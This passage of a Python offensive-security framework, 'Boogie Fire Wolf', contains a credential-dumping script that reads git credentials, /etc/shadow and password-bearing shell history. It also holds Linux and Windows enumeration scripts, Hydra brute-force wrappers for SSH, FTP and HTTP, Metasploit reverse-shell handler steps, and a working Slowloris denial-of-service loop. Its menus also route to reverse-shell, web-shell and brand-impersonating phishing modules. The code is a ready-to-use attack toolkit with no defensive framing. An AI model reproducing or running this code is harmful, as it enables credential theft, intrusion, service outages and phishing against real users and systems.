[ -f ~/.git-credentials ] && echo "  Git: $(cat ~/.git-credentials)"

echo ""
echo "[*] Database Configs:"
find /var/www /home -name "wp-config.php" -o -name ".env" -o -name "database.yml" -o -name "config.php" 2>/dev/null | head -20

echo ""
echo "[*] Passwd/Shadow:"
cat /etc/passwd 2>/dev/null | head -5
echo "---"
cat /etc/shadow 2>/dev/null | head -5 || echo "  (shadow not readable)"

echo ""
echo "[*] Bash History:"
cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE "pass|ssh|mysql|psql|mongodb|api_key|token|secret" | head -20

echo ""
echo "[+] Dump complete!"
'''
        p = os.path.join(DIRS['payloads'], "cred_dumper.sh")
        with open(p, 'w') as f: f.write(script)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")

    @staticmethod
    def enum_linux():
        log.section("LINUX ENUMERATION SCRIPT")
        
        script = '''#!/bin/bash
# BOOGIE LINUX ENUM
echo "=== SYSTEM ==="
uname -a
cat /etc/os-release 2>/dev/null
echo ""
echo "=== USERS ==="
cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v /bin/false
echo ""
echo "=== GROUPS ==="
id
cat /etc/group 2>/dev/null | grep -E "^sudo|^admin|^wheel|^root"
echo ""
echo "=== SUDOERS ==="
cat /etc/sudoers 2>/dev/null || echo "(not readable)"
echo ""
echo "=== NETWORK ==="
ip addr 2>/dev/null || ifconfig
echo ""
echo "=== LISTENING ==="
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo ""
echo "=== CRON ==="
ls -la /etc/cron* 2>/dev/null
echo ""
echo "=== MOUNTS ==="
mount 2>/dev/null | grep -E " / |/dev"
echo ""
echo "=== ENV ==="
env 2>/dev/null
echo ""
echo "=== DONE ==="
'''
        p = os.path.join(DIRS['payloads'], "enum_linux.sh")
        with open(p, 'w') as f: f.write(script)
        os.chmod(p, 0o755)
        log.success(f"Created: {p}")

    @staticmethod
    def enum_windows():
        log.section("WINDOWS ENUMERATION SCRIPT")
        
        script = '''@echo off
REM BOOGIE WINDOWS ENUM
echo === SYSTEM ===
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
echo.
echo === USERS ===
net user
echo.
echo === ADMINISTRATORS ===
net localgroup administrators
echo.
echo === NETWORK ===
ipconfig /all
echo.
echo === LISTENING PORTS ===
netstat -ano | findstr LISTEN
echo.
echo === SERVICES ===
wmic service list brief
echo.
echo === SCHEDULED TASKS ===
schtasks /query /fo LIST /v 2>nul | findstr /B "TaskName: Status:"
echo.
echo === ENV ===
set
echo.
echo === DONE ===
'''
        p = os.path.join(DIRS['payloads'], "enum_windows.bat")
        with open(p, 'w') as f: f.write(script)
        log.success(f"Created: {p}")

    @staticmethod
    def hydra_ssh(target, user, wordlist):
        log.section(f"SSH BRUTEFORCE: {target}")
        log.info(f"Target: {target} User: {user} Wordlist: {wordlist}")
        run(f"hydra -l {user} -P {wordlist} ssh://{target} -t 4 -V", 600)

    @staticmethod
    def hydra_ftp(target, user, wordlist):
        log.section(f"FTP BRUTEFORCE: {target}")
        run(f"hydra -l {user} -P {wordlist} ftp://{target} -t 4 -V", 600)

    @staticmethod
    def hydra_http(target, user, wordlist):
        log.section(f"HTTP AUTH BRUTEFORCE: {target}")
        run(f"hydra -l {user} -P {wordlist} http-get://{target} -t 4 -V", 600)

    @staticmethod
    def metasploit():
        log.section("METASPLOIT INTEGRATION")
        r, o, _ = run("which msfconsole 2>/dev/null")
        if r == 0:
            log.ok(f"Metasploit: {o}")
            log.info("Run: msfconsole")
            log.info("\nCommon commands:")
            log.info("  use exploit/multi/handler")
            log.info("  set PAYLOAD android/meterpreter/reverse_tcp")
            log.info("  set LHOST <your_ip>")
            log.info("  set LPORT <port>")
            log.info("  exploit")
        else:
            log.warn("Metasploit not installed")
            log.info("Install: pkg install metasploit")


# ─── MODULE: NETWORK ──────────────────────────────────────────────

class Network:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║          NETWORK ATTACKS MODULE     ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  ARP Scan (Network Discovery)
  {C.CYAN}2.{C.RESET}  Ping Sweep (ICMP)
  {C.CYAN}3.{C.RESET}  TCP Connect Scan
  {C.CYAN}4.{C.RESET}  SYN Scan (requires root)
  {C.CYAN}5.{C.RESET}  Packet Capture (tcpdump)
  {C.CYAN}6.{C.RESET}  DNS Sniffing
  {C.CYAN}7.{C.RESET}  MAC Address Changer
  {C.CYAN}8.{C.RESET}  Network Stress Test (Slowloris)
  {C.CYAN}9.{C.RESET}  Proxy Chain (Tor)
  {C.CYAN}10.{C.RESET} Show Network Interfaces
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def arp_scan(network):
        log.section(f"ARP SCAN: {network}")
        r, o, _ = run(f"nmap -sn {network}", 60)
        if r != 0:
            # Try Python ARP
            try:
                from scapy.all import ARP, Ether, srp
                arp = ARP(pdst=network)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                ans, _ = srp(ether/arp, timeout=3, verbose=0)
                for sent, recv in ans:
                    log.ok(f"{recv.psrc} - {recv.hwsrc}")
            except:
                log.error("Scapy not available. Install: pip install scapy")
        else:
            print(o)
        save(f"arp_{network.replace('/','_')}", o)

    @staticmethod
    def ping_sweep(network):
        log.section(f"PING SWEEP: {network}")
        try:
            net = ipaddress.ip_network(network, strict=False)
            found = []
            def ping(ip):
                r, _, _ = run(f"ping -c 1 -W 1 {ip}", 2)
                if r == 0:
                    found.append(str(ip))
                    log.ok(f"{ip} is alive")
            
            threads = []
            for ip in net.hosts():
                t = threading.Thread(target=ping, args=(ip,), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 20:
                    for t in threads: t.join()
                    threads = []
            for t in threads: t.join()
            
            log.info(f"Found {len(found)} live hosts")
            save(f"pingsweep_{network.replace('/','_')}", '\n'.join(found))
        except: log.error("Invalid network format. Use CIDR (e.g., 192.168.1.0/24)")

    @staticmethod
    def tcp_scan(target, start=1, end=1000):
        log.section(f"TCP SCAN: {target} ({start}-{end})")
        try:
            ip = socket.gethostbyname(target) if not ipaddress.ip_address(target) else target
        except: log.error(f"Cannot resolve {target}"); return
        
        open_ports = []
        def scan(port):
            if port_open(ip, port):
                banner = grab_banner(ip, port)
                open_ports.append(port)
                log.ok(f"Port {port}/tcp OPEN {banner[:60]}")
        
        total = end - start + 1
        log.info(f"Scanning {total} ports...")
        
        for batch in range(start, end+1, 50):
            batch_end = min(batch+49, end)
            tlist = [threading.Thread(target=scan, args=(p,), daemon=True) for p in range(batch, batch_end+1)]
            for t in tlist: t.start()
            for t in tlist: t.join()
        
        log.info(f"Found {len(open_ports)} open ports: {open_ports}")
        save(f"tcp_{target}_{start}_{end}", '\n'.join(str(p) for p in open_ports))

    @staticmethod
    def packet_capture(interface, count=50):
        log.section(f"PACKET CAPTURE: {interface}")
        log.info(f"Capturing {count} packets...")
        run(f"tcpdump -i {interface} -c {count} -nn -X", 30)

    @staticmethod
    def mac_changer(interface, new_mac=None):
        log.section(f"MAC CHANGER: {interface}")
        if not new_mac:
            new_mac = ':'.join(f"{random.randint(0,255):02x}" for _ in range(6))
        
        cmds = [
            f"ifconfig {interface} down",
            f"ifconfig {interface} hw ether {new_mac}",
            f"ifconfig {interface} up"
        ]
        for cmd in cmds:
            r, _, e = run(cmd, 10)
            if r != 0:
                log.error(f"Failed: {e}")
                return
        log.success(f"MAC changed to {new_mac}")

    @staticmethod
    def slowloris(target, port=80, sockets=200):
        log.section(f"SLOWLORIS: {target}:{port}")
        target = target.replace('http://','').replace('https://','').split('/')[0]
        
        sent = 0
        socks = []
        
        log.info(f"Opening {sockets} connections...")
        try:
            for _ in range(sockets):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                    socks.append(s)
                except: pass
            
            log.info(f"Established {len(socks)} connections. Holding...")
            while True:
                for s in socks[:]:
                    try:
                        s.send(f"X-{rand_str(8)}: {rand_str(16)}\r\n".encode())
                        sent += 1
                    except:
                        socks.remove(s)
                        try: s.close()
                        except: pass
                
                log.info(f"Sent {sent} headers, {len(socks)} sockets active")
                time.sleep(10)
        except KeyboardInterrupt:
            log.warn("Stopping")
            for s in socks:
                try: s.close()
                except: pass

    @staticmethod
    def proxy_tor():
        log.section("TOR PROXY")
        r, _, _ = run("which tor 2>/dev/null")
        if r != 0:
            log.info("Installing tor...")
            run("pkg install tor -y", 30)
        
        log.info("Starting Tor service...")
        run("tor --RunAsDaemon 1 2>/dev/null &", 5)
        time.sleep(3)
        
        log.info("Testing Tor connection...")
        r, o, _ = run("curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null", 10)
        if r == 0:
            log.success(f"Tor active! Response: {o[:100]}")
        else:
            log.error("Tor not responding. Run: tor &")

    @staticmethod
    def show_interfaces():
        log.section("NETWORK INTERFACES")
        run("ip addr 2>/dev/null || ifconfig 2>/dev/null || netstat -i 2>/dev/null", 5)


# ─── MAIN FRAMEWORK ────────────────────────────────────────────────

class Boogie:
    def __init__(self):
        self.target = ""
        self.running = True
        
        # Initialize workspace
        for d in DIRS.values():
            os.makedirs(d, exist_ok=True)
        
        # Setup tab completion
        if 'readline' in sys.modules:
            readline.parse_and_bind('tab: complete')
        
        signal.signal(signal.SIGINT, self._sig_handler)

    def _sig_handler(self, sig, frame):
        print()
        log.warn("Interrupted. Type 'exit' to quit or press Enter for menu")

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        self.clear()
        print(FIRE_WOLF)
        print(BANNER)
        log.info(f"Workspace: {WORKSPACE}")
        log.info(f"Session: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        log.info(f"Target: {self.target or 'Not set'}")
        log.info("")

    def set_target(self):
        t = log.inp("Enter target (domain/IP/URL)")
        if t:
            self.target = t.strip()
            log.ok(f"Target set to: {self.target}")

    def main_menu(self):
        while self.running:
            self.show_banner()
            print(f"""  {C.CYAN}1.{C.RESET}  Reconnaissance        {C.CYAN}8.{C.RESET}  Set Target
  {C.CYAN}2.{C.RESET}  Web Attacks            {C.CYAN}9.{C.RESET}  View Saved Results
  {C.CYAN}3.{C.RESET}  Payload Generator      {C.CYAN}10.{C.RESET} Install Dependencies
  {C.CYAN}4.{C.RESET}  Listener               {C.CYAN}11.{C.RESET} Clear Workspace
  {C.CYAN}5.{C.RESET}  Phishing Kit           {C.CYAN}12.{C.RESET} Show Network Info
  {C.CYAN}6.{C.RESET}  Exploitation           {C.CYAN}13.{C.RESET} Update Boogie
  {C.CYAN}7.{C.RESET}  Network Attacks        {C.CYAN}0.{C.RESET}  Exit
""")
            choice = log.inp("Select option")
            
            handlers = {
                '1': self._recon_menu, '2': self._web_menu,
                '3': self._payload_menu, '4': self._listener_menu,
                '5': self._phish_menu, '6': self._exploit_menu,
                '7': self._net_menu, '8': self.set_target,
                '9': self._view_results, '10': self._install,
                '11': self._clean, '12': Network.show_interfaces,
                '13': self._update, '0': self._exit,
            }
            handler = handlers.get(choice)
            if handler:
                handler()
            else:
                log.error("Invalid option")

    def _ensure_target(self):
        if not self.target:
            self.set_target()
        return self.target

    def _recon_menu(self):
        while True:
            self.clear()
            t = self._ensure_target()
            Recon.menu()
            c = log.inp("Select recon option", "")
            
            handlers = {
                '1': lambda: Recon.dns(t), '2': lambda: Recon.subdomains(t),
                '3': lambda: Recon.cert_transparency(t), '4': lambda: Recon.wayback(t),
                '5': lambda: Recon.portscan(t), '6': lambda: Recon._pyscan(t),
                '7': lambda: Recon.tech(t), '8': lambda: Recon.dirbrute(t),
                '9': lambda: Recon.tech(t), '10': lambda: Recon.whois(t),
                '11': lambda: Recon.email_osint(log.inp("Email address")),
                '12': lambda: Recon.phone_osint(log.inp("Phone number")),
                '13': lambda: Recon.social_search(log.inp("Username")),
                '14': lambda: Recon.dorks(t),
                '15': lambda: Recon.full(t),
            }
            handler = handlers.get(c)
            if handler:
                handler()
                log.inp("Press Enter to continue", "")
            elif c == '0':
                break

    def _web_menu(self):
        while True:
            self.clear()
            t = self._ensure_target()
            Web.menu()
            c = log.inp("Select web option", "")
            
            handlers = {
                '1': lambda: Web.sqli(t), '2': lambda: Web.sqlmap(t),
                '3': lambda: Web.xss(t), '4': lambda: Web.xss(t),
                '5': lambda: Web.lfi(t), '6': lambda: Web.cmdi(t),
                '7': lambda: Web.lfi(t), '8': lambda: log.info("Check redirects with: curl -I " + t),
                '9': lambda: Web.headers(t), '10': lambda: Web.headers(t),
                '11': lambda: Web.waf_detect(t), '12': lambda: Web.full_web(t),
            }
            handler = handlers.get(c)
            if handler:
                handler()
                log.inp("Press Enter to continue", "")
            elif c == '0':
                break

    def _payload_menu(self):
        while True:
            self.clear()
            Payload.menu()
            c = log.inp("Select payload option", "")
            
            if c == '12':  # Custom builder
                Payload.custom()
                log.inp("Press Enter to continue", "")
            elif c == '10':  # Android
                Payload.android(log.inp("LHOST", get_local_ip()), int(log.inp("LPORT", "4444")))
                log.inp("Press Enter to continue", "")
            elif c == '11':  # Meterpreter
                Payload.meterpreter(log.inp("LHOST", get_local_ip()), int(log.inp("LPORT", "4444")))
                log.inp("Press Enter to continue", "")
            elif c in ['1','2','3','4','5','6','7','8','9']:
                host = log.inp("LHOST (your IP)", get_local_ip())
                port = int(log.inp("LPORT", "4444"))
                handlers = {
                    '1': Payload.python_rev, '2': Payload.php_rev, '3': Payload.bash_rev,
                    '4': Payload.perl_rev, '5': Payload.ruby_rev, '6': Payload.nc_rev,
                    '7': lambda h,p: Payload.webshell_php(), '8': lambda h,p: Payload.webshell_asp(),
                    '9': Payload.powershell_rev,
                }
                handlers[c](host, port)
                log.inp("Press Enter to continue", "")
            elif c == '0':
                break

    def _listener_menu(self):
        while True:
            self.clear()
            Listener.menu()
            c = log.inp("Select listener option", "")
            
            if c == '1':
                Listener.netcat(int(log.inp("Port", "4444")))
            elif c == '2':
                Listener.python_listener(int(log.inp("Port", "4444")))
            elif c == '3':
                log.info("Use option 2 with SSH tunnel for encryption")
            elif c == '4':
                Listener.http_server(int(log.inp("Port", "8080")))
            elif c == '5':
                Listener.https_server(int(log.inp("Port", "4433")))
            elif c == '6':
                Listener.php_server(int(log.inp("Port", "8080")))
            elif c == '0':
                break
    
    def _phish_menu(self):
        while True:
            self.clear()
            Phish.menu()
            c = log.inp("Select phishing option", "")
            
            templates = {'1':'facebook','2':'google','3':'instagram','4':'twitter','5':'linkedin','6':'microsoft','7':'otp'}
            if c in templates:
                Phish.deploy(int(log.inp("Port", "8080")), templates[c])
                log.inp("Press Enter to continue", "")
            elif c == '8':
                tmpl = log.inp("Template name [facebook/google/instagram/twitter/linkedin/microsoft/otp/custom]", "custom")
                Phish.create_page(tmpl)
                log.inp("Press Enter to continue", "")
            elif c == '9':
                Phish.deploy(int(log.inp("Port", "8080")), log.inp("Template", "google"))
                log.inp("Press Enter to continue", "")
            elif c == '10':
                Phish.cloudflared()
            elif c == '0':
                break

    def _exploit_menu(self):
        while True:
            self.clear()
            Exploit.menu()
            c = log.inp("Select exploit option", "")
            
            handlers = {
                '1': lambda: Listener.python_listener(int(log.inp("Port", "4444"))),
                '2': Exploit.privesc_check,
                '3': Exploit.cred_dumper,
                '4': Exploit.enum_linux,
                '5': Exploit.enum_windows,
                '6': lambda: Exploit.hydra_ssh(log.inp("Target"), log.inp("Username", "root"), log.inp("Wordlist path")),
                '7': lambda: Exploit.hydra_ftp(log.inp("Target"), log.inp("Username", "anonymous"), log.inp("Wordlist path")),
                '8': lambda: Exploit.hydra_http(log.inp("Target URL"), log.inp("Username", "admin"), log.inp("Wordlist path")),
                '9': Exploit.metasploit,
                '10': Exploit.privesc_check,
            }
            handler = handlers.get(c)
            if handler:
                handler()
                if c not in ['1','6','7','8']:
                    log.inp("Press Enter to continue", "")
            elif c == '0':
                break

    def _net_menu(self):
        while True:
            self.clear()
            Network.menu()
            c = log.inp("Select network option", "")
            
            handlers = {
                '1': lambda: Network.arp_scan(log.inp("Network CIDR", "192.168.1.0/24")),
                '2': lambda: Network.ping_sweep(log.inp("Network CIDR", "192.168.1.0/24")),
                '3': lambda: Network.tcp_scan(log.inp("Target"), int(log.inp("Start port", "1")), int(log.inp("End port", "1000"))),
                '4': lambda: log.info("SYN scan requires root. Use nmap: nmap -sS " + (self.target or "<target>")),
                '5': lambda: Network.packet_capture(log.inp("Interface", "wlan0"), int(log.inp("Packet count", "50"))),
                '6': lambda: log.info("Run: tcpdump -i any port 53 -nn"),
                '7': lambda: Network.mac_changer(log.inp("Interface", "wlan0")),
                '8': lambda: Network.slowloris(log.inp("Target", self.target or "example.com")),
                '9': Network.proxy_tor,
                '10': Network.show_interfaces,
            }
            handler = handlers.get(c)
            if handler:
                handler()
                if c not in ['5','8']:
                    log.inp("Press Enter to continue", "")
            elif c == '0':
                break

    def _view_results(self):
        self.clear()
        log.section("SAVED RESULTS")
        for root, dirs, files in os.walk(WORKSPACE):
            for f in sorted(files):
                fp = os.path.join(root, f)
                size = os.path.getsize(fp)
                rel = os.path.relpath(fp, WORKSPACE)
                print(f"  {C.CYAN}{rel}{C.RESET} ({size} bytes)")
        log.inp("\nPress Enter to continue", "")

    def _install(self):
        self.clear()
        Setup.run()
        log.inp("Press Enter to continue", "")

    def _clean(self):
        if log.inp("Clear all results and logs? (y/n)", "n").lower() == 'y':
            for d in DIRS.values():
                if os.path.exists(d):
                    for f in os.listdir(d):
                        fp = os.path.join(d, f)
                        try:
                            if os.path.isfile(fp): os.unlink(fp)
                            elif os.path.isdir(fp): shutil.rmtree(fp)
                        except: pass
            log.ok("Workspace cleaned")
        log.inp("Press Enter to continue", "")

    def _update(self):
        log.section("UPDATE")
        log.info("Boogie is self-contained. Check for updates at the source.")
        log.inp("Press Enter to continue", "")

    def _exit(self):
        log.info("Shutting down Boogie Framework...")
        self.running = False
        log.info("Goodbye")
        sys.exit(0)

    def run(self):
        # Auto-install on first run
        if not os.path.exists(os.path.join(DIRS['wordlists'], 'subdomains.txt')):
            log.warn("First run detected - installing dependencies...")
            Setup.run()
        
        self.main_menu()


# ─── ENTRY POINT ───────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-v', '--version']:
            print(f"Boogie Fire Wolf v{VERSION}")
            sys.exit(0)
        elif sys.argv[1] in ['-i', '--install']:
            Setup.run()
            sys.exit(0)
    
    try:
        app = Boogie()
        app.run()
    except KeyboardInterrupt:
        print()
        log.info("Exiting...")
        sys.exit(0)
    except Exception as e:
        log.fatal(f"Error: {e}")
        traceback.print_exc()
        sys.exit(1)
